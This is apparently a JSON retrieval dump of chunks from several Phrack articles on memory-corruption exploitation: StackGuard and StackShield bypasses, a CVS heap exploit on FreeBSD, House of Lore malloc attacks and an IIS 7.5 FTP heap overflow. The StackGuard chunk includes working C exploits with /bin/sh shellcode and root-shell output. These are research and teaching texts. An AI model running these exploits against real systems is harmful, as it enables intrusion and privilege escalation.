the top of the stack in main(). Thus, when sprintf() is called, an overrun occurs, redirecting program execution to our shellcode, and all is lost. Note that alignment here is key, since if the compiler pads one of the buffers, we may run into a problem. Which buffer is padded and the contents of the pad bytes both play a role in the success of exploitation. If buf2 is padded, and the padded bytes contain NULL's, no overflow (or, at least, no usable overflow) will occur. If the pad bytes are _not_ null, then as long as the pad bytes end on a double-word boundary (which they almost certainly will), we can still successfully overwrite the saved instruction pointer. If buf1 is padded, whether or not the pad bytes contain NULL's is really of no consequence, as they will fall after our shellcode anyway. ----| Denouement As with all bugs, the fault here is not of the library functions, or of the C programming language, or operating systems not marking data as non-executable, but that programmers do not fully realize the ramifications of what they are doing. Before handling any potentially hazardous materials (arbitrary data), special precautions should be made. Man pages should be read. Buffers should be terminated. Return values should be checked. All it takes is a '+1' and an initialization. How hard is this: char buf[MAXSIZE + 1]; FILE *fd; size_t len; ... memset(buf, 0, MAXSIZE + 1); len = fread((void *)buf, 1, MAXSIZE, fd); /* * This won't actually happen, but it is supplied to * prove a point */ if(len > MAXSIZE){ syslog(LOG_WARNING, \"Overflow occured in pid %d, invoked by %d\\n\", getpid(), getuid()); exit(1); } ... Okay, so the above is a bit silly, but the hopefully the intent is clear. Incidentally, the following also do not terminate on behalf of lazy programmers: fread() the read() family [ read",
                      "hash": "79af6427f8bd768d72400e0165e34e9895e7480b9f314c9be4a7fee4df70d26d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8263185024261475
                    }
                  ]
                },
                {
                  "created": 1679370997220,
                  "document_id": "phrack-64-15",
                  "timestamp": 1180224000000,
                  "tags": ["phrack", "issue-64", "article-15"],
                  "hash": "e8615dae11925398994bbb9ddd57179e76d04ee5f753a20cbf371556fc23bd6a",
                  "text_size": 32191,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": " instead of aborting the program with a signal 11, it will stretch the stack with the expand_stack() function from the kernel. This method is OS generic. Thanks bbp. --[ 4 - A couple of words on the BSD exploitation As promised, here is the explanation of the technique used to exploit the FreeBSD version. Consider the fact that with only minor changes, this exploit was working on other operating systems. In fact, by switching the shellcode and modifying the hardcoded high addresses of the heap, the exploit was fully functional on every system using PHK malloc. This exploit was not restricted only to FreeBSD, a thing that the script kiddies didn't know. I like to see that kind of tricks inside exploits. It makes them powerful for the expert, and almost useless to the kiddie. The technique explained here is an excellent way to take control of the target process, and it could have been easily used in the Linux version of the exploit. The main advantage is that this method does not use the magic of voodoo, so it can help you bypass the security checks done by the malloc code. First, the heap needs to be filled to put it in a predictable state, like for all the heap overflow exploits. Secondly, what we want to do basically is to put a structure containing function pointers right behind the buffer that we can overflow, in order to rewrite functions pointers. In this case, we overwrote the functions pointers entirely and not partially. Once this is done, the only thing that remains to do is to repeatedly send big buffers containing the shellcode to make sure it will be available at a high address in the heap. After, we need to overwrite the function pointer and to trigger the use of this same function. As a result, the shellcode will then be run. Practically, we used the CVS command \"Gzip-stream\" that allocated an array of function pointers, inside a subroutine of the serve_gzip_stream() function. Let's recap: 1. We fill_holes() the PHK's malloc allocator so that the buffer that we are going to overwrite is before a hole in the heap. 2. We allocate the buffer containing 4 pointers to shellcode at the right place. 3. We call the function \"Gzip-stream\" that will allocate an array of function pointers right inside our memory hole. This array will be located right after the buffer that we are going to overflow. 4. We trigger the overflow and we overwrite a function pointer with the address of our shellcode (the macro HEAPBASE in the exploit). See OFFSET variable to know how many bytes we need to overflow. 5. With the \"Entry\" command, we add numerous entries that contain NOPs and shellcode to fill the higher addresses of the heap with our shellcode. 6. We call zflush(1) function which end the gziped-stream and trigger an overwrited function pointer (the zfree one of the struct z_stream). And so on, we retrieve a shell. If we are not yet root, we look if one cvs's passwd file is writable on the whole cvs tree, which was the case at the time on most of servers, we modify it to obtain a root account. We re-exploit the cvs server with this account and - yes it is - we have rO0t on the remote. :-) --[ 5 - Conclusion We thought that it was worth presenting the exploit the way it was done here, to let the reader learn by himself the details of the exploitation code, which is from now on available in the public domain, even though the authors did not want it. From now on, this section will be included in the upcoming releases of phrack. Each issue, we will present the details of an interesting exploit. The exploit will be chosen because its development was interesting and the the author(s) had a strong determination to succeed in building it. Such exploits can be counted on the fingers of your hands (I am talking about the leaked ones). With the hope that you had fun reading this ... --[ 6 - Greeting To MaXX for his great papers on DL malloc.",
                      "hash": "d12728ddab9fc4396ac7ba9c3425cb51c69f654cfbf36d3e8f18456f87dda5a4",
                      "offset": 2,
                      "vector": null,
                      "score": 0.8241337537765503
                    }
                  ]
                },
                {
                  "created": 1679370776042,
                  "document_id": "phrack-56-5",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-5"],
                  "hash": "d1809073f0ac26b7900dfd17fe1577a4d617282ef7153d9b4f01e7068b402739",
                  "text_size": 27229,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "- P H R A C K M A G A Z I N E - Volume 0xa Issue 0x38 05.01.2000 0x05[0x10] |------------------- BYPASSING STACKGUARD AND STACKSHIELD --------------------| |-----------------------------------------------------------------------------| |--------------------- Bulba and Kil3r <lam3rz@hert.org> ---------------------| ----| Preface \"When a buffer overwrites a pointer... The story of a restless mind.\" This article is an attempt to demonstrate that it is possible to exploit stack overflow vulnerabilities on systems secured by StackGuard or StackShield even in hostile environments (such as when the stack is non-executable). ----| StackGuard Overview According to its authors, StackGuard is a \"simple compiler technique that virtually eliminates buffer overflow vulnerabilities with only modest performance penalties.\" [1] We assume that the reader know how buffer overflow attacks work and how to write exploit code . If this is foreign to you, please see P49-14. In a nutshell, we can change a function's return address by writing past the end of local variable buffer. The side effect of altering a function's return address is that we destroy/modify all stack data contained beyond end of the overflowed buffer. What does StackGuard do? It places a \"canary\" word next to the return address on the stack. If the canary word has been altered when the function returns, then a stack smashing attack has been attempted, and the program responds by emitting an intruder alert into syslog, and then halts. Consider the following figure: ... ... |-----------------------------------| | parameters passed to function | |-----------------------------------| | function's return address (RET) | |-----------------------------------| | canary | |-----------------------------------| | local frame pointer (%ebp) | |-----------------------------------| | local variables | |-----------------------------------| ... ... To be effective, the attacker must not be able to \"spoof\" the canary word by embedding the value for the canary word in the attack string. StackGuard offers two techniques to prevent canary spoofing: \"terminator\" and \"random\". A terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff) -- four characters that should terminate most string operations, rendering the overflow attempt harmless. A random canary is chosen at random at the time the program execs. Thus the attacker cannot learn the canary value prior to the program start by searching the executable image. The random value is taken from /dev/urandom if available, and created by hashing the time of day if /dev/urandom is not supported. This randomness is sufficient to prevent most prediction attempts. ----| StackShield StackShield uses a different technique. The idea here is to create a separate stack to store a copy of the function's return address. Again this is achieved by adding some code at the very beginning and the end of a protected function. The code at the function prolog copies the return address to special table, and then at the epilog, it copies it back to the stack. So execution flow remains unchanged -- the function always returns to its caller. The actual return address isn't compared to the saved return address, so there is no way to check if a buffer overflow occurred. The latest version also adds some protection against calling function pointers that point at address not contained in .TEXT segment (it halts program execution if the return value has changed). It might seem like these two systems are infallible. They're not. ----| \"Nelson Mengele must be free\" \"...an attacker can bypass StackGuard protection using buffer overflows to alter other pointers in the program besides the return address, such as function pointers and longjmp buffers, which need not even be on the stack.\" [2] OK. So. Do we need a bit of luck to overflow a function pointer or a longjmp? You bet! It's not exactly commonplace to find such a pointer located after our buffer, and most programs do not have it at all. It is much more likely to find some other kind of pointer. For example: [root@sg StackGuard]# cat vul.c // Example vulnerable program. int f (char ** argv) { int pipa; // useless variable char *p; char a[30]; p=a; printf (\"p=%x\\t -- before 1st strcpy\\n\",p); strcpy(p,argv[1]); // <== vulnerable strcpy() printf (\"p=%x\\t -- after 1st strcpy\\n\",p); strncpy(p,argv[2],16); printf(\"After second strcpy ;)\\n\"); } main (int argc, char ** argv) { f(argv); execl(\"back_to_vul\",\"\",0); //<-- The exec that fails printf(\"End of program\\n\"); } As you can see, we just overwrite the return address by overflowing our buffer. But this will get us nowhere since our program is StackGuard protected. But the simplest, obvious route is not always the best one. How about we just overwrite the `p` pointer? The second (safe) strncpy() operation will go straight to memory pointed by us. What if p points at our return address on the stack? We're altering the function's return without even touching the canary. So what do we require for our attack? 1. We need pointer p to be physically located on the stack after our buffer a[]. 2. We need an overflow bug that will allow us to overwrite this p pointer (i.e.: an unbounded strcpy). 3. We need one *copy() function (strcpy, memcopy, or whatever) that takes *p as a destination and user-specified data as the source, and no p initialization between the overflow and the copy. Obviously, given the above limitations not all programs compiled with StackGuard are going to be vulnerable, but such a vulnerabilities are out there. For example, the wu-ftpd 2.5 mapped_path bug, where overflowing the mapped_path buffer could alter the Argv and LastArg pointers used by setproctitle() resulting in the ability to modify any part of the process' memory. Granted, it was *data* based overflow (not stack-based) but, on the other hand, this shows that the requirements for our above vulnerability are definitely fulfilled in real world. So how are we going to exploit it? We overwrite p so it will point to the address of RET on the stack and thus the next *copy() will overwrite our RET without touching the canary :) Yes, we need to smuggle in the shellcode as well (we use argv[0]). Here is a sample exploit (we used execle() to make it environment independent): [root@sg StackGuard]# cat ex.c /* Example exploit no. 1 (c) by Lam3rZ 1999 :) */ char shellcode[] = \"\\xeb\\x22\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x31\\xc0\\xaa\" \"\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x31\\xc0\\xab\\xb0\\x08\\x04\" \"\\x03\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xd9\\xff\" \"\\xff\\xff/bin/sh\"; char addr[5]=\"AAAA\\x00\"; char buf[36]; int * p; main() { memset(buf,'A',32); p = (int *)(buf+32); *p=0xbffffeb4; // <<== let us point at RET p = (int *)(addr); *p=0xbfffff9b; // <<== new RET value execle(\"./vul\",shellcode,buf,addr,0,0); } As tested on a StackGuarded RH 5.2 Linux box: [root@sg StackGuard]# gcc vul.c -o vul [root@sg StackGuard]# gcc ex.c [root@sg StackGuard]# ./a.out p=bffffec4 -- before 1st strcpy p=bffffeb4 -- after 1st strcpy bash# As you can see, the first strcpy() overwrites p, then strncpy() copies the new RET value so that when it returns it takes address of our shellcode. Kaboom! This technique works with programs compiled with regular gcc or StackGuarded gcc, but StackShield compiled programs are proof against this. ----| There is no spoon I talked with Crispin Cowan <crispin@cse.ogi.edu>, one of the StackGuard developers and he proposed a remediation against above hack. Here's his idea: \"The XOR Random Canary defense: here, we adopt Aaron Grier's ancient proposal to xor the random canary with the return address. The canary validation code used on exit from functions then XOR's the return address with the proper random canary (assigned to this function at exec() time) to compute what the recorded random canary on the stack should be. If the attacker has hacked the return address, then the xor'd random canary will not match. The attacker cannot compute the canary to put on the stack without knowing the random canary value. This is effectively encryption of the return address with the random canary for this function. The challenge here is to keep the attacker from learning the random canary value. Previously, we had proposed to do that by just surrounding the canary table with red pages, so that buffer overflows could not be used to extract canary values. However, Emsi's [described above] attack lets him synthesize pointers to arbitrary addresses.\" (The simplest solution there is to) \"mprotect() the canary table to prevent the attacker from corrupting it.\" We informed Crispin that we're going to write an article about it and his response was: \"I think we can have a revised StackGuard compiler (with the XOR random canary) ready for release on Monday.\" That compiler has been released. [3] StackShield offers an (almost) equal level of security by saving the RET copy in safe place (of arbitrary location and size -- not necessarily a good practice however) and checking its integrity before doing the return. We can bypass that. If we have a pointer that can be manipulated, we can use it to overwrite things that can help us exploit a vulnerable overflow in a program. For example, take the fnlist structure that holds functions registered via atexit(3) or on_exit(3). To reach this branch of code, of course, the program needs to call exit(), but most programs do this either at the end of execution or when an error occurs (and in most cases we can force an error exception). Let's look at the fnlist structure: [root@sg StackGuard]# gdb vul GNU gdb 4.17.0.4 with Linux/x86 hardware watchpoint and FPU support [...] This GDB was configured as \"i386-redhat-linux\"... (gdb) b main Breakpoint 1 at 0x8048790 (gdb) r Starting program: /root/StackGuard/c/StackGuard/vul Breakpoint 1, 0x8048790 in main () (gdb) x/10x &fnlist 0x400eed78 <fnlist>: 0x00000000 0x00000002 0x00000003 0x4000b8c0 0x400eed88 <fnlist+16>: 0x00000000 0x00000003 0x08048c20 0x00000000 0x400eed98 <fnlist+32>: 0x00000000 0x00000000 We can see that it calls two functions: _fini [0x8048c20] and _dl_fini [0x4000b8c0] and that neither of these take any arguments (checkout glibc sources to understand how to read the fnlist content). We can overwrite both of these functions. The fnlist address is dependent on the libc library, so it will be the same for every process on a particular machine. The following code exploits a vulnerable overflow when the program exits via exit(): [root@sg StackGuard]# cat 3ex.c /* Example exploit no. 2 (c) by Lam3rZ 1999 :) */ char shellcode[] = \"\\xeb\\x22\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x31\\xc0\\xaa\" \"\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x31\\xc0\\xab\\xb0\\x08\\x04\" \"\\x03\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xd9\\xff\" \"\\xff\\xff/bin/sh\"; char addr[5]=\"AAAA\\x00\"; char buf[36]; int * p; main() { memset(buf,'A',32); p = (int *)(buf+32); *p=0x400eed90; // <<== Address of entry in fnlist which we'll modify p = (int *)(addr); *p=0xbfffff9b; // <<== Address of new function to call (shellcode) :) execle(\"./vul\",shellcode,buf,addr,0,0); } As you can see our exploit has changed only by one line :) Let's test it against our vulnerable program: [root@sg StackGuard]# gcc 3ex.c [root@sg StackGuard]# ./a.out p=bffffec4 -- before 1st strcpy p=400eed90 -- after 1st strcpy After second strcpy ;) End of program bash# As you can see our program gave us a shell after the end of normal execution. Neither StackGuard nor StackShield cannot protect against this kind of attack. But what if our program do not call exit() but uses _exit() instead? Let's see what happens when we overwrite the canary. A StackGuarded program will call __canary_death_handler() (this function is responsible for logging the overflow attempt and terminating the process). Let's look at it: void __canary_death_handler (int index, int value, char pname[]) { printf (message, index, value, pname) ; syslog (1, message, index, value, pname) ; raise (4) ; exit (666) ; } As you can see, we have a call to exit() at the very end. Granted, exploiting the program this way will generate logs, but if there is no other way, it's a necessary evil. Besides, if you get root, you can just groom them later. We received some email from Perry Wagle <wagle@cse.ogi.edu> (another Stackguard author): \"I seem to",
                      "hash": "f324c67e1a350919a290db1f68ebcfdb572544646c18855a416e556f60fbaf7c",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8238335251808167
                    }
                  ]
                },
                {
                  "created": 1679371080557,
                  "document_id": "phrack-67-8",
                  "timestamp": 1289952000000,
                  "tags": ["phrack", "issue-67", "article-8"],
                  "hash": "fb3e8da29086f3faccad23f9cbf9cbd8baddcd272a8e88a6d9e42f6195d6589f",
                  "text_size": 96276,
                  "chunk_count": 7,
                  "chunks": [
                    {
                      "text": " wild. The preconditions are clear, this has been seen repeatedly throughout of this article. The obvious difference between the PoC's that I presented here and the applications you use every day (as well as email clients, or web browsers), is that one can not predict in a first chance the current state of the heap. And this is really a problem, because while this is not in a fairly stable and predictable state, the chances of exploiting will be minimal. But very high-level hackers have already met once this class of problems, and over time have been designing and developing a series of techniques which allow reordering the heap so that both, the position of the allocated chunks as the data contained within them, are parameters controlled by the user. Among these techniques, we must appoint two best known: - Heap Spray - Heap Feng Shui You can read something about them in the following paper presented at the BlackHat 2007 [8]. In short we can say that the \"Heap Spray\" technique simply fill in the heap as far as possible by requesting large amount of memory placing there repetitions of nop sleds and the opportune shellcode, then just simply find a predictable memory address for the \"primitive 4-byte overwrite\". A very clever idea in this technique is to make the nop sled values equal to the selected address, so that it will be self-referential. Feng Shui is a much more elaborate technique, it first tries to defragment the Heap by filling the holes. Then it comes back to create holes in the upper controlled zone so that the memory remains as: [ chunk | hole | chunk | hole | chunk | hole | chunk ] ... and finally tries to create the buffer to overflow in one of these holes, knowing that this will always be adjacent to one of its buffers containing information controlled by the exploiter. We will not talk about it more here. Just say that although some of these methodologies may seem time consuming and fatigue making, without them nobody could create reliable exploits, or obtain success in most of the attempts. << Programming today is a race between software engineers striving to build bigger and better idiot-proof programs, and the Universe trying to produce bigger and better idiots. So far, the Universe is winning. >> [ Rich Cook ] .---------------. ---[ 6 ---[ Conclusions ]--- .---------------. In this article we have seen how The House of Lore hid inside of itself a power much greater than we imagined. We also presented a fun example showing that, despite not being vulnerable to all the techniques we knew so far, it was still vulnerable to one that until now had only been described theoretically. We detail a second method of attack also based on the corruption of a largebin, this attack could be an alternative in some circumstances and should be as important as the main method of the smallbin corruption. Finally we detailed a way to apply THoL in version 3 of the Ptmalloc library, which many thought was not vulnerable to attacks due to the imposition of numerous restrictions. Reviewing and analyzing in depth some of the security mechanisms that have been implanted in this library, allowed to find that further studies will be needed to discover new vulnerabilities and areas of code that can be manipulated for personal fun and profit. If you want a tip from mine on how to improve your hacking, here goes: Reads everything, study everything... then forget it all and do it differently, do it better. Fill your cup, empty your cup and fill it again with fresh water. Finally, I would like to recall that I said the following in my \"Malloc Des-Maleficarum\" paper: \"...and The House of Lore, although not very suitable for a credible case, no one can say that is a complete exception...\" With this new article I hope I have changed the meaning of my words, and shown that sometimes in hacking you make mistakes, but never stop to investigate and repair your errors. Everything we do is for fun, and we will do it as long as we exist on the land and cyberspace. << All truths are easy to understand once they are discovered; the point is to discover them. >> [ Galileo Galilei ] .-------------------. ---[ 7 ---[ Acknowledgments ]--- .-------------------. First, I would like to give my acknowledgments to Dreg for his insistence for that I would do something with this paper and it not to fall into oblivion. After a bad time ... I could not give a talk on this subject at RootedCon [9], Dreg still graciously encouraged me to finish the translation and publish this article in this fantastic e-zine which undoubtedly left its mark etched in the hacking history. Indeed, the last details in the translation of this article are Dreg's work, and this would never have been what it is without his invaluable help. For the rest, also thanks to all the people I met in dsrCON!, all very friendly, outgoing and all with their particular point of madness. I am not going to give more names, but, to all of them, thanks. And remember... Happy Hacking! .--------------. ---[ 8 ---[ References ]--- .--------------. [1] Malloc Maleficarum http://www.packetstormsecurity.org/papers/attack/MallocMaleficarum.txt [2] Malloc Des-Maleficarum http://www.phrack.org/issues.html?issue=66&id=10 [3] PTMALLOC (v2 & v3) http://www.malloc.de/en/ [4] Reducing the effective entropy of gs cookies http://uninformed.org/?v=7&a=2&t=sumry [5] Electric Fence - Red-Zone memory allocator http://perens.com/FreeSoftware/ElectricFence/ electric-fence_2.1.13-0.1.tar.gz [6] Jemalloc - A Scalable Concurrent malloc(3) Implementacion for FreeBSD http://people.freebsd.org/~jasone/jemalloc/bsdcan2006/jemalloc.pdf [7] Guard Malloc (Enabling the Malloc Debugging Features) http://developer.apple.com/mac/library/documentation/Darwin/Reference/ ManPages/man3/Guard_Malloc.3.html [8] Heap Feng Shui in JavaScript - BlackHat Europe 2007 http://www.blackhat.com/presentations/bh-europe-07/Sotirov/ Presentation/bh-eu-07-sotirov-apr19.pdf [9] Rooted CON: Congreso de Seguridad Informatica (18-20 Marzo 2010) http://www.rootedcon.es/ [10] dnmalloc http://www.fort-knox.org/taxonomy/term/3 [11] OpenBSD malloc http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/stdlib/malloc.c [12] Dnmaloc - A more secure memory allocator by Yves Younan, Wouter Joosen, Frank Piessens and Hans Van den Eynden http://www.orkspace.net/secdocs/Unix/Protection/Description/ Dnmaloc%20-%20A%20more%20secure%20memory%20allocator.pdf [13] A new malloc(3) for OpenBSD by Otto Moerbeek http://www.tw.openbsd.org/papers/eurobsdcon2009/otto-malloc.pdf .----------------. ---[ 9 ---[ Wargame Code ]--- .----------------. In this last section we attach the same program \"agents.c\" that we saw above but adapted to network environment so that it can be feasible to use in a servers exploitation wargame. At the same time the code is a bit more elaborate and robust. As usual, \"netagents.c\" forks a child process (fork) for each connection made to it, and as each new process has its own heap, each attacker can confront the vulnerability based on zero. The actions of one not influence to others. The code should be adapted according to the needs of the manager conducting or developing the wargame (as well as the number of allowed incoming connections or debugging information you want to give to the attacker if the game becomes very difficult). The attached archive includes a makefile which assumes that in the same directory as the source is the compiled library ptmalloc2 (libmalloc.a) to be linked with netagents.c. Each should adapt \"malloc.c\" to print the information it deems necessary, but the basics would be the changes that have been made throughout this article, which allows the attacker to know from where they extract the chunks of memory requested. How the attacker obtains the output of these changes? For simplicity, \"netagents.c\" prevents calls to send( ) by closing the standard output (stdout) and duplicating it with the recent obtained client socket (dup(CustomerID)). We use the same trick as the shellcodes expected. \"netagents.c\" also includes a new menu option, \"Show Heap State\", in order to see the state of the memory chunks that are being allocated or released during its execution, this allows you to see if the head of any free chunk has been overwritten. After some legal moves, a normal output would be this: +--------------------------------+ | Allocated Chunk (0x8093004) | -> Agents[0] +--------------------------------+ | SIZE = 0x00000019 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x809301c) | -> Agents[1] +--------------------------------+ | SIZE = 0x00000019 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x8093034) | -> Agents[1]->name +--------------------------------+ | SIZE = 0x00000029 | +--------------------------------+ +--------------------------------+ | Free Chunk (0x8093058) | -> Agents[1]->lastname +--------------------------------+ | PREV_SIZE = 0x00000000 | +--------------------------------+ | SIZE = 0x00000089 | +--------------------------------+ | FD = 0x08050168 | +--------------------------------+ | BK = 0x08050168 | +--------------------------------+ +--------------------------------+ | Allocated Chunk (0x80930e4) | -> Agents[1]->desc +--------------------------------+ | SIZE = 0x00000108 | +--------------------------------+ Following the example of the perl exploit presented in 2.2.2, one might design an exploit in C with a child process continually receiving responses from the server (menus and prompts), and the father answering these questions with a pause, for example one second each answer (if you know what to respond to work that program ...). The difficult task is to predict the addresses on the stack, which in the last phase of the attack, the last reserved chunk should match the frame created by \"edit_lastname( )\" since that it is where we overwrite the saved return address and where the program probably will break (it is obvious that ASLR enabled suppose a new complexity to overcome). What happens with failed attempts and segmentation failures? The program captures SIGSEGV and informs the attacker that something bad has happened and encourages him to connect again. The child process is the only that becomes unstable and thus a new connection leaves everything clean for a new attack. The latest aid that one could provide to the attacker is to deliver the source code, so this could be adapted to study the vulnerability in local, and then carry his attack to the network environment. Attach:",
                      "hash": "2fe69cace1f1a1af35dc5d942a7fc4cd7fe97a18d257f2245bf7885ac3a6883b",
                      "offset": 6,
                      "vector": null,
                      "score": 0.8235756158828735
                    }
                  ]
                },
                {
                  "created": 1679371111092,
                  "document_id": "phrack-68-12",
                  "timestamp": 1334361600000,
                  "tags": ["phrack", "issue-68", "article-12"],
                  "hash": "79cabcaca0468c0af299169cffb1c49f7ff42e19e9dc0368f6e5f06ae9682ad4",
                  "text_size": 41600,
                  "chunk_count": 4,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0e, Issue 0x44, Phile #0x0c of 0x13 |=-----------------------------------------------------------------------=| |=-------------=[ The Art of Exploitation ]=-----------------=| |=-----------------------------------------------------------------------=| |=-------------------=[ Exploiting MS11-004 ]=-----------------------=| |=----------=[ Microsoft IIS 7.5 remote heap buffer overflow ]=----------=| |=-----------------------------------------------------------------------=| |=------------------------=[ by redpantz ]=----------------------------=| |=-----------------------------------------------------------------------=| --[ Table of Contents 1 - Introduction 2 - The Setup 3 - The Vulnerability 4 - Exploitation Primitives 5 - Enabling the LFH 6 - FreeEntryOffset Overwrite 7 - The Impossible 8 - Conclusion 9 - References 10 - Exploit (thing.py) --[ 1 - Introduction Exploitation of security vulnerabilities has greatly increased in difficulty since the days of the Slammer worm. There have been numerous exploitation mitigations implemented since the early 2000's. Many of these mitigations were focused on the Windows heap; such as Safe Unlinking and Heap Chunk header cookies in Windows XP Service Pack 2 and Safe Linking, expanded Encoded Chunk headers, Terminate on Corruption, and many others in Windows Vista/7 [1]. The widely deployed implementation of anti-exploitation technologies has made gaining code execution from vulnerabilities much more expensive (notice that I say \"expensive\" and not \"impossible\"). By forcing the attacker to acquire more knowledge and spend expansive amounts of research time, the vendor has made exploiting these vulnerabilities increasingly difficult. This article will take you through the exploitation process (read: EIP) of a heap overflow vulnerability in Microsoft IIS 7.5 (MS11-004) on a 32-bit, single-core machine. While the target is a bit unrealistic for the real-world, and exploit reliability may be a bit suspect, it does suffice in showing that an \"impossible to exploit\" vulnerability can be leveraged for code execution with proper knowledge and sufficient time. Note: The structure of this article will reflect the steps, in order, taken when developing the exploit. It differs from the linear nature of the actual exploit because it is designed to show the thought process during exploit development. Also, since this article was authored quite some time after the initial exploitation process, some steps may have been left out (i.e. forgotten); quite sorry about that. --[ 2 - The Setup A proof of concept was released by Matthew Bergin in December 2010 that stated there existed an unauthenticated Denial of Service (DoS) against IIS FTP 7.5, which was triggered on Windows 7 Ultimate [3]. The exploit appeared to lack precision, so it was decided further investigation was necessary. After creating a test environment, the exploit was run with a debugger attached to the FTP process. Examination of the error concluded it wasn't a DoS and most likely could be used to achieve remote code execution: BUGCHECK_STR: APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_\\ heap_failure_freelists_corruption PRIMARY_PROBLEM_CLASS: ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption DEFAULT_BUCKET_ID: ACTIONABLE_HEAP_CORRUPTION_heap_failure_freelists_corruption STACK_TEXT: 77f474cb ntdll!RtlpCoalesceFreeBlocks+0x3c9 77f12eed ntdll!RtlpFreeHeap+0x1f4 77f12dd8 ntdll!RtlFreeHeap+0x142 760074d9 KERNELBASE!LocalFree+0x27 72759c59 IISUTIL!BUFFER::FreeMemory+0x14 724ba6e3 ftpsvc!FTP_COMMAND::WriteResponseAndLog+0x8f 724beff8 ftpsvc!FTP_COMMAND::Process+0x243 724b6051 ftpsvc!FTP_SESSION::OnReadCommandCompletion+0x3e2 724b76c7 ftpsvc!FTP_CONTROL_CHANNEL::OnReadCommandCompletion+0x1e4 724b772a ftpsvc!FTP_CONTROL_CHANNEL::AsyncCompletionRoutine+0x17 7248f182 ftpsvc!FTP_ASYNC_CONTEXT::OverlappedCompletionRoutine+0x3c 724a56e6 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x89 724a58c1 ftpsvc!THREAD_POOL_DATA::ThreadPoolThread+0x24 724a4f8a ftpsvc!THREAD_MANAGER::ThreadManagerThread+0x42 76bf1194 kernel32!BaseThreadInitThunk+0xe 77f1b495 ntdll!__RtlUserThreadStart+0x70 77f1b468 ntdll!_RtlUserThreadStart+0x1b While simple write-4 primitives have been extinct since the Windows XP SP2 days [1], there was a feeling that currently known, but previously unproven techniques could be leveraged to gain code execution. Adding fuel to the fire was a statement from Microsoft stating that the issue \"is a Denial of Service vulnerability and remote code execution is unlikely\" [4]. With the wheels set in motion, it was time to figure out the vulnerability, gather exploitation primitives, and subvert the flow of execution by any means necessary... --[ 3 - The Vulnerability The first order of business was to figure out the root cause of the vulnerability. Understanding the root cause of the vulnerability was integral into forming a more refined and concise proof of concept that would serve as a foundation for exploit development. As stated in the TechNet article, the flaw stemmed from an issue when processing Telnet IAC codes [5]. The IAC codes permit a Telnet client to tell the Telnet server various commands within the session. The 0xFF character denotes these commands. TechNet also describes a process that requires the 0xFF characters to be 'escaped' when sending a response by adding an additional 0xFF character. Now that there is context around the vulnerability, the corresponding crash dump can be further analyzed. Afterwards we can open the binary in IDA Pro and attempt to locate the affected code. Unfortunately, after statically cross-referencing the function calls from the stack trace, there didn't seem to be any functions that performed actions on Telnet IAC codes. While breakpoints could be set on any of the functions in the stack trace, another path was taken. Since the public symbols named most of the important functions within the ftpsvc module, it was deemed more useful to search the function list than set debugger breakpoints. A search was made for any function starting with 'TELNET', resulting in 'TELNET_STREAM_CONTEXT::OnReceivedData' and 'TELNET_STREAM_CONTEXT::OnSendData'. The returned results proved to be viable after some quick dynamic analysis when sending requests and receiving responses. The OnReceivedData function was investigated first, since it was the first breakpoint that was hit. Essentially the function attempts to locate Telnet IAC codes (0xFF), escape them, parse the commands and normalize the request. Unfortunately it doesn't account for seeing two consecutive IAC codes. The following is pseudo code for important portions of OnReceivedData: TELNET_STREAM_CONTEXT::OnReceivedData(char *aBegin, DATA_STEAM_BUFFER *aDSB, ...) { DATA_STREAM_BUFFER *dsb = aDSB; int len = dsb->BufferLength; char *begin = dsb->BufferBegin; char *adjusted = dsb->BufferBegin; char *end = dsb->BufferEnd; char *curr = dsb->BufferBegin; if(len >= 3) { //0xF2 == 242 == Data Mark if(begin[0] == 0xFF && begin[1] == 0xFF && begin[2] == 0xF2) curr = begin + 3; } bool seen_iac = false; bool seen_subneg = false; if(curr >= end) return 0; while(curr < end) { char curr_char = *curr; //if we've seen an iac code //look for a corresponding cmd if(seen_iac) { seen_iac = false; if(seen_subneg) { seen_subneg = false; if(curr_char < 0xF0) *adjusted++ = curr_char; } else { if(curr_char != 0xFA) { if(curr_char != 0xFF) { if(curr_char < 0xF0) { PuDbgPrint(\"Invalid command %c\", curr_char) if(curr_char) *adjusted++ = curr_char; } } else { if(curr_char) *adjusted++ = curr_char; } } else { seen_iac = true; seen_subneg = true; } } } else { if(curr_char == 0xFF) seen_iac = true; else if(curr_char) *adjusted++ = curr_char; } curr++; } dsb->BufferLength = adjusted - begin; return 0; } The documentation states Telnet IAC codes can be used by: \"Either end of a Telnet conversation can locally or remotely enable or disable an option\". The diagram below represents the 3-byte IAC command within the overall Telnet connection stream: 0x0 0x2 -------------------------------- [IAC][Type of Operation][Option] -------------------------------- Note: The spec should have been referenced before figuring out the vulnerability, instead of reading the code and attempting to figure out what could go wrong. Although there is code to escape IAC characters, the function does not except to see two consecutive 0xFF characters in a row. Obviously this could be a problem, but it didn't appear to contain any code that would result in overflow. Thinking about the TechNet article recalled the line 'error in the response', so the next logical function to examine was 'OnSendData'. Shortly into the function it can be seen that OnSendData is looking for IAC (0xFF) codes: .text:0E07F375 loc_E07F375: .text:0E07F375 inc edx .text:0E07F376 cmp byte ptr [edx], 0FFh .text:0E07F379 jnz short loc_E07F37C .text:0E07F37B inc edi .text:0E07F37C .text:0E07F37C loc_E07F37C: .text:0E07F37C cmp edx, ebx .text:0E07F37E jnz short loc_E07F375 ; count the number ; of \"0xFF\" characters The following pseudo code represents the integral pieces of OnSendData: 